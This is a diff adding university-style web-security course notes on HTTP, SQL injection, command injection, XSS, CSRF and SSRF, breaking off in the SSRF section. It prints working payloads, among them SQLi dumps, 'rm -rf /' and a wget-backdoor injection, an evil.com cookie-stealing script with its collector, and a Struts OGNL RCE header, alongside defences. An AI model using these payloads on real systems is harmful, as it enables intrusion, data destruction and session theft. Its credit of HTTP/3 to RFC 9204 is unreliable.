@@ -3438,6 +3438,2745 @@ sudo ettercap -G
 
 ---
 
+# 0x08 Web Application Security Basics
+
+## Table of Contents
+1. [HTTP Basics & Web Architecture](#http-basics--web-architecture)
+2. [Tools for Web Application Analysis](#tools-for-web-application-analysis)
+3. [Server-Side Scripting (PHP)](#server-side-scripting-php)
+4. [OWASP Top 10](#owasp-top-10)
+5. [SQL Injection Attacks](#sql-injection-attacks)
+6. [Command Injection Attacks](#command-injection-attacks)
+7. [Defensive Measures](#defensive-measures)
+8. [Practical Workshop Examples](#practical-workshop-examples)
+
+---
+
+## HTTP Basics & Web Architecture
+
+### What is the Web?
+- **Web (World Wide Web)**: A collection of data and services
+- **Data and services** are provided by **web servers**
+- **Data and services** are accessed using **web browsers** (Chrome, Firefox, etc.)
+
+### Elements of the Web
+
+#### URLs (Uniform Resource Locators)
+- **Domain**: Located after double slashes (`//`), before the next single slash
+  - Defines which web server to contact
+  - Example: `https://myuni.adelaide.edu.au/courses/95262`
+- **Path**: Located after the first single slash
+  - Defines which file on the web server to fetch
+  - Example: `/courses/95262`
+- **Query**: Optional, located after a question mark (`?`)
+  - Supplies arguments to the web server for processing
+  - Arguments supplied as `name=value` pairs
+  - Multiple arguments separated with ampersands (`&`)
+  - Example: `?is_announcement=true`
+
+#### HTML (Hypertext Markup Language)
+- Markup language for creating structured documents
+- Defines elements on a webpage with **tags**
+- Tags defined with angle brackets `<>`
+- Examples: `<img>` for images, `<b>` for bold text
+
+### HTTP (Hypertext Transfer Protocol)
+
+#### Key Characteristics
+- **Current version**: HTTP/3 (RFC 9204 - 2022)
+- **Protocol type**: Application-level protocol for distributed, collaborative, hypermedia information systems
+- **Default port**: TCP port 80 (can be any TCP port)
+- **Stateless protocol**: Sessions maintained by unique Session ID, passed as Cookie or in URL
+
+#### HTTP Methods
+- **GET**: Retrieve data
+- **POST**: Submit data
+- **PUT**: Update data
+- **DELETE**: Remove data
+- **HEAD**: Get headers only
+- **OPTIONS**: Get allowed methods
+- **TRACE**: Diagnostic tool
+- **CONNECT**: Establish tunnel
+- **PATCH**: Partial update
+
+#### HTTP Status Codes
+- **200**: OK
+- **301**: Moved permanently
+- **302**: Found (moved temporarily)
+- **404**: Not Found
+- **500**: Server Error
+
+#### HTTP Data Transfer Methods
+
+##### GET Requests
+- Data passed as query string in URL
+- Example: `http://catalog/search?term=sqli&lang=en`
+- **Advantages**: Easy to use
+- **Disadvantages**: Sensitive data visible in URL, cached by proxy servers
+
+##### POST Requests
+- Data passed in request body
+- Used for web form submissions
+- Body format similar to query string: `color=red&taste=bitter&shape=odd`
+- **Advantages**: Data not visible in URL
+- **Disadvantages**: More complex to implement
+
+### Web Application Architecture (3-Tier)
+
+```
+Client ↔ Web Server ↔ Database Server
+```
+
+#### Typical Data Flow:
+1. **User requests page** (Client)
+2. **HTTP GET request** (Client → Web Server)
+3. **Interpret request** (Web Server)
+4. **Query database** (Web Server → Database)
+5. **Return data** (Database → Web Server)
+6. **Construct response** (Web Server)
+7. **HTTP response** (Web Server → Client)
+8. **Browser renders page** (Client)
+
+### HTTP Headers
+
+#### Example Request Header
+```http
+GET security.php HTTP/1.1
+Host: dvwa.hacklab.uofa
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://dvwa.hacklab.uofa/index.php
+```
+
+#### Example Response Header
+```http
+HTTP/1.1 200 OK
+Date: Mon, 19 Mar 2018 14:40:08 GMT
+Server: Apache/2.4.10 (Debian)
+Set-Cookie: PHPSESSID=cpoglm6ep83q2bj2609th0kn75; path=/; httponly
+Set-Cookie: security=impossible; httponly
+Content-Length: 123
+Content-Type: text/html; charset=UTF-8
+```
+
+### Cookies
+
+#### Purpose
+1. **Session management**: Logins, shopping carts
+2. **Personalization**: User preferences, themes, settings
+3. **Tracking**: Recording and analyzing user behavior
+
+#### Cookie Safety Directives
+- **HttpOnly**: Disallows accessing cookie via JavaScript (prevents XSS session hijacking)
+- **Secure**: Only send cookie over HTTPS (prevents MITM attacks)
+- **SameSite**: Send only from same site (helps prevent CSRF)
+
+#### Cookie Format
+```
+Set-Cookie: <name>=<value>[; <Max-Age>=<age>]
+[; expires=<date>][; domain=<domain_name>]
+[; path=<some_path>][; secure][; HttpOnly]
+```
+
+---
+
+## Tools for Web Application Analysis
+
+### Developer Tools (Built-in Browser Tools)
+- **Access**: Press F12 in most browsers
+- **Features**:
+  - Inspect HTML/CSS
+  - View network requests/responses
+  - Debug JavaScript
+  - Modify page elements in real-time
+
+### Local Proxy Tools
+
+#### Burp Suite (Most Popular)
+- **Function**: Intercepts and records HTTP requests (like Wireshark for web traffic)
+- **Default setup**: Listens on `localhost:8080`
+- **Key features**:
+  - **Proxy**: Capture and modify traffic on-the-fly
+  - **Repeater**: Repeat GET and POST requests for testing
+  - **Intruder**: Systematic testing with payloads (brute force)
+  - **Spider**: Automatically crawl links to discover pages
+  - **Scanner**: Automatically look for vulnerabilities
+  - **Audit**: Look for hidden directories and files
+
+#### OWASP ZAP
+- Free alternative to Burp Suite
+- Similar functionality for web application security testing
+
+#### Key Advantages
+- Bypass front-end controls (read-only fields, hidden fields, JavaScript validation)
+- Modify requests before they reach the server
+- Record and analyze all HTTP traffic
+
+---
+
+## Server-Side Scripting (PHP)
+
+### What is PHP?
+- **PHP**: Hypertext Preprocessor (current version 8.2)
+- **Server-side scripting language** that can be embedded into HTML
+- **Goal**: Generate client-side code (HTML, CSS, JavaScript)
+
+### PHP Syntax Basics
+
+#### PHP Tags
+- Start: `<?php`
+- End: `?>`
+
+#### Example PHP File
+```php
+<html>
+<head>
+    <title>PHP Introduction</title>
+</head>
+<body>
+    This is HTML! <br />
+    <?php
+        echo 'This is PHP! <br />'; // prints to screen
+        /*
+        Multi-line comment
+        */
+    ?>
+</body>
+</html>
+```
+
+#### PHP Comments
+- Single line: `//` or `#`
+- Multi-line: `/* ... */`
+
+### PHP Lifecycle
+1. **Browser requests** `.php` file
+2. **Web server** receives request
+3. **PHP engine** processes PHP code
+4. **Server returns** generated HTML
+5. **Browser receives** standard HTML (PHP code not visible to client)
+
+### Vulnerable PHP Example
+```php
+<?php
+if(isset($_POST['ping'])) {
+    $ip = $_POST['ip'];
+    $cmd = shell_exec('ping -c 4 '.$ip); 
+    print("<pre>{$cmd}</pre>");
+}
+?>
+```
+**Why dangerous**: User input directly concatenated into shell command without validation.
+
+---
+
+## OWASP Top 10
+
+### Overview
+- **OWASP**: Open Web Application Security Project
+- **Purpose**: Not-for-profit organization dedicated to web security
+- **OWASP Top 10**: Rankings and remediation guidance for top 10 critical web application security risks
+
+### OWASP Top 10 (2021 vs 2017)
+
+| 2017 | 2021 |
+|------|------|
+| A01: Injection | A01: Broken Access Control |
+| A02: Broken Authentication | A02: Cryptographic Failures |
+| A03: Sensitive Data Exposure | A03: Injection |
+| A04: XML External Entities (XXE) | A04: Insecure Design |
+| A05: Broken Access Control | A05: Security Misconfiguration |
+| A06: Security Misconfiguration | A06: Vulnerable and Outdated Components |
+| A07: Cross-Site Scripting (XSS) | A07: Identification and Authentication Failures |
+| A08: Insecure Deserialization | A08: Software and Data Integrity Failures |
+| A09: Using Components with Known Vulnerabilities | A09: Security Logging and Monitoring Failures |
+| A10: Insufficient Logging & Monitoring | A10: Server-Side Request Forgery (SSRF) |
+
+---
+
+## SQL Injection Attacks
+
+### Database Fundamentals
+
+#### SQL Databases
+- **SQL**: Structured Query Language
+- **Structure**: Each database contains multiple tables
+- **Tables**: Predefined structure with columns (fields) and rows (entries)
+
+#### Example Table Structure
+| ID | User | Firstname | Lastname | Password | Email |
+|----|------|-----------|----------|----------|-------|
+| 1 | jsmith | John | Smith | password | jsmith@xx.com |
+| 2 | jdoe | John | Doe | toor | jdoe@yy.com |
+| 3 | bsmith | George | Michael | Monkey | gmic@zz.com |
+
+### SQL Basics
+
+#### SELECT Statement
+```sql
+SELECT firstname, lastname FROM users;
+```
+**Result**: Returns firstname and lastname columns for all users
+
+#### WHERE Clause
+```sql
+SELECT lastname FROM users WHERE firstname='John' OR id < 3;
+```
+**Result**: Returns users named John OR with ID less than 3
+
+#### UNION Query
+```sql
+SELECT firstname, lastname FROM users1 
+UNION 
+SELECT fname, lname FROM users2;
+```
+**Result**: Combines results from two tables (must have same number of columns)
+
+### SQL Injection Attack Types
+
+#### 1. Authentication Bypass (`' OR 1=1--`)
+
+**Vulnerable Code:**
+```php
+$sql = "SELECT user FROM users WHERE username = '$user' AND password='$password'";
+```
+
+**Attack Input:** `blah' OR 1=1--`
+
+**Resulting Query:**
+```sql
+SELECT user FROM users WHERE username = 'blah' OR 1=1--' AND password='$password'
+```
+
+**Explanation:**
+- `'` closes the username string
+- `OR 1=1` makes condition always true
+- `--` comments out the rest (password check ignored)
+
+#### 2. UNION-based Data Extraction
+
+**Vulnerable Code:**
+```php
+$sql = "SELECT name, price FROM catalogue WHERE id=$id";
+```
+
+**Attack Input:** `1 UNION SELECT name, password FROM users#`
+
+**Resulting Query:**
+```sql
+SELECT name, price FROM catalogue WHERE id=1 UNION SELECT name, password FROM users#
+```
+
+**Result**: Extracts usernames and passwords from users table
+
+#### 3. Batched SQL Statements
+
+**Attack Input:** `Robert'); DROP TABLE Students;--`
+
+**Resulting Query:**
+```sql
+SELECT name FROM students WHERE first_name = 'Robert'); DROP TABLE Students;--') AND (active = true)
+```
+
+**Result**: Deletes the entire Students table (Bobby Tables attack)
+
+### Advanced SQL Injection Techniques
+
+#### Information Gathering Queries
+
+**Get MySQL Version:**
+```sql
+5' UNION SELECT 1, @@version#
+```
+
+**Get Current User:**
+```sql
+5' UNION SELECT 1, user()#
+```
+
+**Get Database Name:**
+```sql
+5' UNION SELECT 1, database()#
+```
+
+**List All Tables:**
+```sql
+5' UNION SELECT 1, table_name FROM information_schema.tables#
+```
+
+**List Columns in Specific Table:**
+```sql
+5' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name='users'#
+```
+
+### Blind SQL Injection
+
+#### Characteristics
+- Attacker cannot directly observe database query results
+- Must infer information based on application behavior
+- Two types:
+  - **Content-based**: Different responses for TRUE/FALSE conditions
+  - **Time-based**: Use SLEEP() functions to detect TRUE/FALSE
+
+#### Content-Based Blind SQLi Example
+```sql
+1' AND substr(password,1,1)="5"#
+```
+- If response is "User exists" → first character of password is "5"
+- If response is "User missing" → first character is not "5"
+- Repeat for each character position
+
+#### Time-Based Blind SQLi Example
+```sql
+1' AND IF(substr(password,1,1)="5", SLEEP(5), 0)#
+```
+- If response takes 5+ seconds → first character is "5"
+- If response is immediate → first character is not "5"
+
+### SQLMap Tool
+
+#### Purpose
+- Automated SQL injection detection and exploitation
+- Highly automated with minimal effort required
+
+#### Basic Usage
+```bash
+sqlmap --url="http://target/vulnerable.php?id=1" --cookie="session_cookie"
+```
+
+#### Advanced Options
+```bash
+# Enumerate databases
+sqlmap --url="..." --dbs
+
+# Enumerate tables
+sqlmap --url="..." --tables
+
+# Dump specific table
+sqlmap --url="..." -T users -C user,password --dump
+
+# Use proxy for traffic analysis
+sqlmap --url="..." --proxy="http://localhost:8080"
+```
+
+---
+
+## Command Injection Attacks
+
+### Overview
+- **Similar to SQL injection** but targets OS commands instead of database queries
+- **Attack vector**: User input used as part of system commands
+- **Impact**: Arbitrary command execution on server
+
+### Example Vulnerable Code
+```php
+$results = shell_exec("whois " . $user_input);
+```
+
+### Attack Examples
+
+#### Basic Command Injection
+**Input:** `ua.edu.au; rm -rf /`
+**Executed Command:** `whois ua.edu.au; rm -rf /`
+**Result:** Deletes all files on server
+
+#### Command Chaining Operators
+- `;` - Execute commands sequentially
+- `&&` - Execute second command only if first succeeds
+- `||` - Execute second command only if first fails
+- `&` - Execute commands in parallel
+
+### Real-World Example: Apache Struts RCE
+
+#### Vulnerability Details
+- **Target**: Apache Struts framework
+- **Vector**: Improperly validated Content-Type HTTP header
+- **Exploitation**: Inject OGNL (Object-Graph Navigation Language) code
+- **Impact**: Remote code execution on server
+
+#### Attack Example
+```http
+Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+```
+
+---
+
+## Defensive Measures
+
+### Input Validation and Sanitization
+
+#### Whitelist Approach (Preferred)
+```php
+// Only allow valid IP addresses
+if (preg_match("/^([0-9]{1,3}\.){3}[0-9]{1,3}$/", $ip)) {
+    $cmd = shell_exec('ping -c 4 ' . $ip);
+    print("<pre>{$cmd}</pre>");
+} else {
+    print("Invalid IPv4 format!");
+}
+```
+
+#### Blacklist Approach (Less Secure)
+```php
+// Remove dangerous characters (can be bypassed)
+$ip = preg_replace("/;/", "", $ip);
+```
+
+### SQL Injection Prevention
+
+#### 1. Prepared Statements (Best Practice)
+```php
+// Vulnerable approach
+$sql = "SELECT id, name, grade FROM students WHERE name='" . $username . "' AND password='" . sha1($password) . "'";
+
+// Secure approach with prepared statements
+$stmt = $conn->prepare("SELECT id, name, grade FROM students WHERE name = ? AND password = ?");
+$stmt->bind_param('ss', $username, $password);
+$stmt->execute();
+$result = $stmt->get_result();
+```
+
+#### 2. Input Validation
+```php
+// Validate input format
+if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+    die("Invalid email format");
+}
+
+// Validate numeric input
+if (!is_numeric($id)) {
+    die("Invalid ID format");
+}
+```
+
+#### 3. Escape Special Characters
+```php
+// Escape dangerous characters
+$username = mysqli_real_escape_string($connection, $username);
+```
+
+#### 4. Use Safe APIs
+- **PHP**: PDO (PHP Data Objects) instead of mysqli
+- **Java**: PreparedStatement instead of Statement
+- **Python**: Parameterized queries in DB-API
+
+### Command Injection Prevention
+
+#### 1. Avoid System Calls
+```php
+// Instead of shell_exec("ping " . $host)
+// Use built-in functions or libraries when possible
+```
+
+#### 2. Input Validation
+```php
+// Only allow alphanumeric characters and dots for hostnames
+if (preg_match("/^[a-zA-Z0-9.-]+$/", $hostname)) {
+    // Safe to proceed
+}
+```
+
+#### 3. Use Safe Functions
+```php
+// Use escapeshellarg() for shell arguments
+$safe_arg = escapeshellarg($user_input);
+$cmd = shell_exec("ping -c 4 " . $safe_arg);
+```
+
+### Client-Side vs Server-Side Validation
+
+#### Client-Side Validation (HTML5)
+```html
+<input type="text" name="ip" pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$" title="invalid ip address">
+```
+**Purpose**: Better user experience
+**Security**: Can be easily bypassed (modify HTML in browser)
+
+#### Server-Side Validation (PHP)
+```php
+if (preg_match("/^([0-9]{1,3}\.){3}[0-9]{1,3}$/", $ip)) {
+    // Process valid input
+} else {
+    // Reject invalid input
+}
+```
+**Purpose**: Security enforcement
+**Security**: Cannot be bypassed by client
+
+### Best Practices Summary
+
+1. **Never trust user input**
+2. **Use prepared statements** for database queries
+3. **Implement proper input validation** (whitelist approach)
+4. **Use both client-side and server-side validation**
+5. **Escape special characters** when building dynamic queries
+6. **Use safe APIs** that handle parameterization automatically
+7. **Apply principle of least privilege** to database users
+8. **Regular security testing** and code reviews
+
+---
+
+## Practical Workshop Examples
+
+### Workshop 0x08 Overview
+
+#### Part 1: Command Injection and SQL Injection
+#### Part 2: XSS, CSRF (next workshop)
+
+### Setting Up Environment
+
+#### 1. Start Apache2
+```bash
+sudo systemctl start apache2
+sudo systemctl enable apache2
+```
+
+#### 2. Enable PHP Error Messages
+```bash
+sudo sed -i -e '/display_errors =/ s/= .*/= on/' /etc/php/8.1/apache2/php.ini
+```
+
+#### 3. Test Environment
+- Access: `http://localhost`
+- Should see Apache default page
+
+### Command Injection Workshop
+
+#### Vulnerable Ping Server (ping.php)
+```php
+<html><body>
+<h1>Welcome to the Ping Server</h1>
+<form method="post">
+IP: <input type="text" name="ip">
+<input type="submit" name="ping">
+</form>
+<?php
+if(isset($_POST['ping'])) {
+    $ip = $_POST['ip'];
+    $cmd = shell_exec('ping -c 4 '.$ip); 
+    print("<pre>{$cmd}</pre>");
+}
+?>
+</body></html>
+```
+
+#### Attack Examples
+1. **Basic injection**: `127.0.0.1; ls /`
+2. **File reading**: `127.0.0.1; cat /etc/passwd`
+3. **Backdoor**: `127.0.0.1; wget https://bad_server/backdoor; backdoor 4444`
+
+#### Client-Side Validation Bypass
+1. Add pattern validation:
+```html
+<input type="text" name="ip" pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$" title="invalid ip address">
+```
+2. Bypass: Use F12 developer tools to remove pattern attribute
+3. Submit malicious payload
+
+#### Secure Implementation
+```php
+<?php
+if(isset($_POST['ping'])) {
+    $ip = $_POST['ip'];
+    $ip = preg_replace("/;/","",$ip); // Naive filter (insufficient)
+    if (preg_match("/^([0-9]{1,3}\.){3}[0-9]{1,3}$/", $ip)) {
+        $cmd = shell_exec('ping -c 4 ' . $ip); 
+        print("<pre>{$cmd}</pre>");
+    } else {
+        print("Invalid IPv4 format!");
+    }
+}
+?>
+```
+
+### SQL Injection Workshop
+
+#### Database Setup
+1. **Start MySQL**:
+```bash
+sudo systemctl start mysql
+sudo mysql
+```
+
+2. **Create Database**:
+```sql
+CREATE DATABASE workshop8;
+GRANT ALL PRIVILEGES ON workshop8.* TO 'dbuser'@'localhost' IDENTIFIED BY 'password123';
+```
+
+3. **Create Table**:
+```sql
+CREATE TABLE students (
+    id INT NOT NULL AUTO_INCREMENT,
+    name VARCHAR(40) NOT NULL,
+    password VARCHAR(40) NOT NULL,
+    grade VARCHAR(2) NOT NULL,
+    PRIMARY KEY (id)
+);
+```
+
+4. **Insert Test Data**:
+```sql
+INSERT INTO students (name, password, grade) VALUES ('Ryoma', sha1('password123'), 'A');
+INSERT INTO students (name, password, grade) VALUES ('Kaoru', sha1('pretzels'), 'B');
+INSERT INTO students (name, password, grade) VALUES ('Higa', sha1('princeoftennis'), 'F');
+```
+
+#### Vulnerable Login System
+```php
+<?php
+session_start();
+if (isset($_POST['login'])) {
+    $conn = new mysqli("localhost", "dbuser", "password123", "workshop8");
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    
+    // VULNERABLE: Direct string concatenation
+    $sql = "SELECT id, name, grade FROM students WHERE name='" . $username . "' AND password='" . sha1($password) . "';";
+    
+    if($res = $conn->query($sql)) {
+        if ($res->num_rows > 0) {
+            $row = $res->fetch_assoc();
+            $_SESSION['id'] = $row['id'];
+            $_SESSION['name'] = $row['name'];
+            $_SESSION['grade'] = $row['grade'];
+        } else {
+            echo "Wrong name or password";
+        }
+    }
+}
+?>
+```
+
+#### SQL Injection Attacks
+
+##### Authentication Bypass
+**Input**: `blah' OR 1=1#`
+**Result**: Logs in as first user (bypasses password check)
+
+##### Data Extraction with UNION
+**Input**: `5' UNION SELECT 1, @@version#`
+**Result**: Reveals MySQL version
+
+**Input**: `5' UNION SELECT user, password FROM users#`
+**Result**: Extracts all usernames and password hashes
+
+##### LIMIT Manipulation
+**Input**: `blah' OR 1=1 LIMIT 1,1#`
+**Result**: Logs in as second user instead of first
+
+#### Secure Implementation
+```php
+<?php
+if (isset($_POST['login'])) {
+    $username = $_POST['username'];
+    $password = sha1($_POST['password']);
+    $conn = new mysqli("localhost", "dbuser", "password123", "workshop8");
+    
+    // SECURE: Using prepared statements
+    $stmt = $conn->prepare("SELECT id, name, grade FROM students WHERE name = ? AND password = ?");
+    $stmt->bind_param('ss', $username, $password);
+    $stmt->execute();
+    $result = $stmt->get_result();
+    $user = $result->fetch_object();
+    
+    if ($user) {
+        $_SESSION['id'] = $user->id;
+        $_SESSION['name'] = $user->name;
+        $_SESSION['grade'] = $user->grade;
+    } else {
+        echo "Wrong name or password";
+    }
+}
+?>
+```
+
+### Burp Suite Configuration
+
+#### Setup Process
+1. **Launch Burp Suite** from applications menu
+2. **Create temporary project** → Start Burp
+3. **Configure Proxy**: Default localhost:8080
+4. **Firefox Configuration**:
+   - Settings → Network Settings
+   - Manual proxy configuration: localhost:8080
+5. **Enable localhost capture**:
+   - about:config → network.proxy.allow_hijacking_localhost = true
+
+#### Using Burp for SQL Injection
+1. **Capture requests** during normal application use
+2. **Send to Repeater** for manual testing
+3. **Modify parameters** to test injection payloads
+4. **Analyze responses** for signs of successful injection
+
+### DVWA (Damn Vulnerable Web Application)
+
+#### Access and Setup
+1. **Connect to HacklabVM**: `http://<IP>/DVWA`
+2. **Login**: admin:password
+3. **Create/Reset Database**
+4. **Set Security Level**: Low (for learning), Medium/High (for advanced testing)
+
+#### Practice Scenarios
+- **Command Injection**: Test various OS command payloads
+- **SQL Injection**: Practice different injection techniques
+- **Security Level Progression**: Start with Low, advance to Medium/High
+- **Source Code Review**: Use "View Source" to understand vulnerabilities
+
+---
+
+## Exam Preparation Checklist
+
+### Key Concepts to Master
+- [ ] HTTP request/response structure
+- [ ] GET vs POST methods
+- [ ] Cookie security attributes
+- [ ] SQL query syntax (SELECT, WHERE, UNION)
+- [ ] SQL injection types and payloads
+- [ ] Command injection techniques
+- [ ] Input validation methods
+- [ ] Prepared statements
+- [ ] Burp Suite functionality
+
+### Common Attack Patterns
+- [ ] `' OR 1=1--` (authentication bypass)
+- [ ] UNION SELECT attacks for data extraction
+- [ ] Command chaining with `;`, `&&`, `||`
+- [ ] Blind SQL injection techniques
+- [ ] Client-side validation bypass
+
+### Defensive Techniques
+- [ ] Server-side input validation
+- [ ] Prepared statements/parameterized queries
+- [ ] Whitelist vs blacklist approaches
+- [ ] Safe API usage
+- [ ] Principle of least privilege
+
+### Tools and Techniques
+- [ ] Browser developer tools usage
+- [ ] Burp Suite proxy configuration
+- [ ] SQLMap command-line usage
+- [ ] Manual payload crafting
+- [ ] Response analysis for blind attacks
+
+---
+
+# 0x09 Advanced Web Exploits
+
+## Overview
+
+This workshop covers advanced web application security vulnerabilities, focusing on practical exploitation techniques and defense mechanisms.
+
+### Key Topics Covered:
+- Cross-Site Scripting (XSS) - Reflected vs Stored
+- Cross-Site Request Forgery (CSRF)
+- Server-Side Request Forgery (SSRF)
+- Directory Bursting/Forced Browsing
+- File Upload Vulnerabilities
+- Local File Inclusion (LFI)
+- Defense mechanisms against web exploits
+
+---
+
+## JavaScript Fundamentals
+
+### What is JavaScript?
+- **Client-side programming language** that runs in web browsers
+- Code is sent by the server as part of HTTP responses
+- Used to manipulate web pages (HTML and CSS)
+- Makes modern websites interactive
+- Supported by all modern web browsers
+
+### JavaScript in Web Pages
+JavaScript can be embedded in HTML through several methods:
+
+1. **Direct embedding in `<script>` tags**:
+   ```html
+   <script>alert("Hello World!")</script>
+   ```
+
+2. **External file references**:
+   ```html
+   <script type="text/JavaScript" src="functions.js"></script>
+   ```
+
+3. **Event handler attributes**:
+   ```html
+   <a href="http://www.yahoo.com" onmouseover="alert('hi');">Link</a>
+   ```
+
+4. **Pseudo-URL links**:
+   ```html
+   <a href="javascript:alert('You clicked');">Click me</a>
+   ```
+
+### JavaScript Security Implications
+JavaScript can be abused to:
+- **Modify webpage content** (HTML/CSS manipulation)
+- **Make HTTP requests** to external servers
+- **Access browser APIs** and user data
+- **Redirect users** to malicious sites
+
+---
+
+## Cross-Site Scripting (XSS)
+
+### Definition
+Cross-Site Scripting (XSS) is a vulnerability where attackers inject malicious JavaScript into legitimate websites, which then executes in victims' browsers with the origin of the legitimate website.
+
+### XSS Attack Flow
+1. Attacker adds malicious JavaScript to a legitimate website
+2. Legitimate website sends the attacker's JavaScript to browsers
+3. Attacker's JavaScript runs with the origin of the legitimate website
+4. JavaScript can access cookies, sessions, and perform actions as the user
+
+### Types of XSS
+
+#### 1. Reflected XSS (Non-Persistent)
+- **Characteristics**:
+  - Payload usually in GET/POST parameters
+  - Not stored in the application database
+  - Requires victim to click malicious link
+  - More common but lower risk than Stored XSS
+
+- **Example Scenario**:
+  ```php
+  // Vulnerable PHP code
+  <?php echo "Your query " . $_GET['query'] . " returned $num results.";?>
+  ```
+  
+  **Attack**: `search.php?query=<script>alert(1)</script>`
+  
+  **Result**: `Your query <script>alert(1)</script> returned 0 results`
+
+- **Attack Steps**:
+  1. Attacker sends email with malicious link
+  2. Victim clicks link with malicious parameters
+  3. Server inserts malicious params into HTML
+  4. HTML with injected attack code sent to victim
+  5. Victim's browser executes malicious script
+
+#### 2. Stored XSS (Persistent)
+- **Characteristics**:
+  - Attacker's JavaScript stored on legitimate server
+  - Sent to all users who view the infected page
+  - Higher risk due to wider impact
+  - Classic example: Social media posts, forums, comments
+
+- **Example**: Facebook page with malicious JavaScript in user content
+- **Impact**: Anyone loading the attacker's page sees JavaScript with Facebook's origin
+
+### Session Hijacking via XSS
+
+#### Cookie Theft Technique
+```javascript
+<script>
+var img = document.createElement("img");
+img.src="http://evil.com/cookiemonster.php?cookie=" + document.cookie;
+</script>
+```
+
+#### Attack Process:
+1. User authenticates to target website (receives session cookie)
+2. User visits page with XSS payload (while logged in)
+3. Malicious script executes and steals session cookie
+4. Cookie sent to attacker's server
+5. Attacker uses stolen session to impersonate user
+
+#### Cookie Theft Server (cookiemonster.php):
+```php
+<?php
+if($_REQUEST["cookie"]) { 
+    $file = fopen("cookies.txt", "a"); 
+    fwrite($file, "Cookie from:" . $_SERVER['REMOTE_ADDR'] . "\n");
+    fwrite($file, "Date/time: " . date("F j, Y, g:i a") . " \n");
+    fwrite($file, "Cookie: " . $_REQUEST["cookie"] . "\n\n"); 
+    fclose($file);
+    print("Thank you for the cookie :)\n");
+}
+?>
+```
+
+### XSS Defense Mechanisms
+
+#### 1. HTML Sanitization/Output Encoding
+- **Concept**: Convert special characters to HTML entities
+- **Implementation**:
+  ```php
+  // Vulnerable
+  echo "Hello " . $_REQUEST["user_input"];
+  
+  // Secure
+  echo "Hello " . htmlspecialchars($_REQUEST["user_input"]);
+  ```
+
+- **HTML Entity Encoding**:
+  - `&` → `&amp;`
+  - `"` → `&quot;`
+  - `'` → `&#039;`
+  - `<` → `&lt;`
+  - `>` → `&gt;`
+
+#### 2. HttpOnly Cookie Flag
+- **Purpose**: Prevents client-side scripts from accessing cookies
+- **Implementation**: `Set-Cookie: session=xxx; HttpOnly`
+- **Result**: `document.cookie` cannot access the cookie
+
+#### 3. Secure Cookie Flag
+- **Purpose**: Ensures cookies only sent over HTTPS
+- **Implementation**: `Set-Cookie: session=xxx; Secure`
+
+#### 4. Content Security Policy (CSP)
+- **Purpose**: Instructs browser to only use resources from specific sources
+- **Implementation**: HTTP header specifying policy
+- **Benefits**:
+  - Disallows inline scripts (prevents inline XSS)
+  - Only allows scripts from specified domains
+  - Blocks XSS from linking to external scripts
+
+- **Example CSP Header**:
+  ```
+  Content-Security-Policy: script-src 'self'
+  ```
+
+---
+
+## Cross-Site Request Forgery (CSRF)
+
+### Definition
+CSRF is an attack that exploits cookie-based authentication to perform unintended actions as an authenticated user by tricking them into making malicious requests.
+
+### How CSRF Works
+
+#### Prerequisites:
+1. User is authenticated to target website (has valid session cookie)
+2. Target website uses cookie-based authentication
+3. Attacker can trick user into making a request
+
+#### Attack Steps:
+1. **User authenticates** to target server (receives session cookie)
+2. **Attacker tricks victim** into making malicious request to server
+3. **Server accepts request** because valid cookie is automatically attached
+
+### CSRF Attack Examples
+
+#### 1. GET Request via Image Tag
+```html
+<img src="https://bank.com/transfer?amount=1000&to=attacker">
+```
+- Image tag automatically makes GET request
+- Browser attaches relevant cookies
+- Request appears legitimate to server
+
+#### 2. GET Request via Direct Link
+```
+https://bank.com/transfer?amount=1000&to=attacker
+```
+- Attacker sends link via email/social media
+- User clicks link while authenticated
+- Transfer executes using user's session
+
+#### 3. POST Request via JavaScript
+```html
+<script>
+fetch('https://bank.com/transfer', {
+    method: 'POST',
+    body: 'amount=1000&to=attacker'
+});
+</script>
+```
+
+### CSRF vs Reflected XSS
+- **Reflected XSS**: HTTP response contains malicious JavaScript (client-side execution)
+- **CSRF**: Malicious HTTP request made with user's cookies (server-side effect)
+
+### CSRF Defense Mechanisms
+
+#### 1. CSRF Tokens
+- **Concept**: Include unique, unpredictable token in each form
+- **Implementation**:
+  ```php
+  // Generate token
+  $_SESSION['csrf_token'] = md5(uniqid());
+  
+  // Validate token
+  if($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+      die("CSRF token validation failed");
+  }
+  ```
+
+#### 2. Referrer Validation
+- **Concept**: Check `Referer` header to ensure request originates from same site
+- **Limitation**: Referrer header is optional and can be spoofed
+
+#### 3. SameSite Cookies
+- **Concept**: Controls whether cookies sent with cross-site requests
+- **Implementation**: `Set-Cookie: session=xxx; SameSite=strict`
+- **Values**:
+  - `strict`: Never send cookie with cross-site requests
+  - `lax`: Send cookie with top-level navigation
+  - `none`: Always send cookie (requires Secure flag)
+
+---
+
+## Server-Side Request Forgery (SSRF)
+
+### Definition
+SSRF occurs when a web application fetches remote resources without validating user-supplied URLs, allowing attackers to make requests to internal systems.
+
+### SSRF Attack Scenarios
+
+#### Basic Example:
+```
+Normal request: GET /api/v1/fetch?url=https://site.com/image.jpeg
+Malicious request: GET /api/v1/fetch?url=https://internal.company.com/admin
+```
+
+#### Attack Capabilities:
+- **Access internal services** behind firewalls
+- **Bypass network access controls**
+- **Scan internal network** for services
